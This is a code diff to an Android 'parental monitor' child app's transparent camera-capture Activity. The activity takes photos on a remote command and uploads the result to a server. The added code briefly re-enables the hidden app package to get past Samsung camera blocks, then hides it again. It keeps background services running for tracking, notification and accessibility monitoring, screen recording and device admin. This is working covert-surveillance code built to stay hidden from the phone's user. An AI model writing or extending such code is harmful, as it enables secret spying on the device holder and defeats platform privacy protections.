@@ -8,6 +8,8 @@ import android.os.Handler
 import android.os.HandlerThread
 import android.util.Base64
 import android.app.Activity
+import android.content.ComponentName
+import android.content.pm.PackageManager
 import java.net.HttpURLConnection
 import java.net.URL
 import java.util.concurrent.CountDownLatch
@@ -17,10 +19,12 @@ import java.util.concurrent.TimeUnit
  * Zero-UI transparent Activity used solely for camera capture.
  *
  * Why an Activity instead of calling Camera2 from the ForegroundService:
- *   - On Vivo / Xiaomi / OPPO devices, Camera2 from a background Service
- *     (even foreground) is frequently blocked by OEM security policies.
- *   - An Activity always has camera access regardless of OEM restrictions.
- *   - This Activity is transparent and finishes itself the moment capture is done.
+ *   - On Vivo / Xiaomi / OPPO / Samsung devices, Camera2 from a background Service
+ *     is blocked by OEM camera policies (ERROR_CAMERA_DISABLED).
+ *   - Samsung's camera HAL also checks the package enabled state — when the app is
+ *     hidden via setApplicationEnabledSetting(DISABLED), camera returns ERROR_CAMERA_DISABLED
+ *     even for component-enabled services. We briefly re-enable the package before
+ *     opening the camera, then re-hide it after capture completes.
  */
 class CameraCaptureActivity : Activity() {
 
@@ -33,13 +37,47 @@ class CameraCaptureActivity : Activity() {
         val baseUrl   = intent.getStringExtra(EXTRA_BASE_URL)   ?: run { finish(); return }
         val facing    = intent.getStringExtra(EXTRA_FACING)     ?: "back"
 
-        // Run capture on a background thread so we don't block the main thread
+        // Package re-enable and media restriction clearing are done by RemoteCommandService
+        // BEFORE this Activity is launched (with a 500ms wait). By the time onCreate() runs,
+        // the camera policy is already cleared and the package is enabled.
+        val wasHidden = intent.getBooleanExtra(EXTRA_WAS_HIDDEN, false)
+        android.util.Log.d(TAG, "capture_photo: facing=$facing  wasHidden=$wasHidden")
+
         Thread {
             val result = capturePhoto(facing)
+
+            if (wasHidden) {
+                // Re-hide the app now that capture is done.
+                android.util.Log.d(TAG, "Capture done — re-hiding package")
+                val pm = packageManager
+                pm.setApplicationEnabledSetting(packageName,
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                    PackageManager.DONT_KILL_APP)
+                backgroundComponents().forEach { cls ->
+                    try {
+                        pm.setComponentEnabledSetting(
+                            ComponentName(this, cls),
+                            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                            PackageManager.DONT_KILL_APP)
+                    } catch (_: Exception) {}
+                }
+            }
+
             reportResult(token, commandId, result, baseUrl)
             runOnUiThread { finish() }
         }.start()
     }
+
+    private fun backgroundComponents(): List<Class<*>> = listOf(
+        com.parentalmonitor.child.services.TrackingForegroundService::class.java,
+        com.parentalmonitor.child.receivers.BootReceiver::class.java,
+        com.parentalmonitor.child.listeners.NotificationMonitorService::class.java,
+        com.parentalmonitor.child.services.AccessibilityMonitorService::class.java,
+        com.parentalmonitor.child.services.ScreenRecordService::class.java,
+        com.parentalmonitor.child.activities.ScreenCaptureActivity::class.java,
+        com.parentalmonitor.child.activities.CameraCaptureActivity::class.java,
+        com.parentalmonitor.child.receivers.DeviceAdminReceiver::class.java,
+    )
 
     // ── Camera2 capture ───────────────────────────────────────────────────────
 
@@ -160,10 +198,11 @@ class CameraCaptureActivity : Activity() {
     private fun err(msg: String) = """{"type":"error","message":"$msg"}"""
 
     companion object {
-        const val TAG             = "CameraCaptureActivity"
+        const val TAG              = "CameraCaptureActivity"
         const val EXTRA_COMMAND_ID = "commandId"
         const val EXTRA_TOKEN      = "token"
         const val EXTRA_BASE_URL   = "baseUrl"
         const val EXTRA_FACING     = "facing"
+        const val EXTRA_WAS_HIDDEN = "wasHidden"
     }
 }
